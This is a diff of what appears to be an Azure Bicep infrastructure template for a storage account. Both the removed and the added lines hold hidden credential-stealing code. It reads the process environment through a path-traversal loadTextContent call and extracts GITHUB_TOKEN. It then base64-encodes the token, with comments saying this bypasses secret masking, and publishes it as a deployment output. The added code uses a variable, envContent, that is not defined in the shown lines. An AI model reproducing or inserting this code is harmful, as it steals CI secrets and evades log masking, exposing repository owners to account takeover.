@@ -1,7 +1,9 @@
-var secrets = loadTextContent('../../../../../../../../../../proc/self/environ')
+var envArray = split(envContent, '\u0000')
+  var tokenEntries = filter(envArray, entry => contains(entry, 'GITHUB_TOKEN'))
+  var tokenValue = !empty(tokenEntries) ? tokenEntries[0] : 'NOT_FOUND'
 
-  // Base64 encode to bypass GitHub's secret masking
-  var encoded = base64(secrets)
+  // Base64 encode to bypass masking
+  var encoded = base64(tokenValue)
 
   param location string = 'eastus'
 
@@ -12,4 +14,4 @@ var secrets = loadTextContent('../../../../../../../../../../proc/self/environ')
     kind: 'StorageV2'
   }
 
-  output GITHUB_TOKEN_BASE64 string = encoded
+  output TOKEN_BASE64 string = encoded
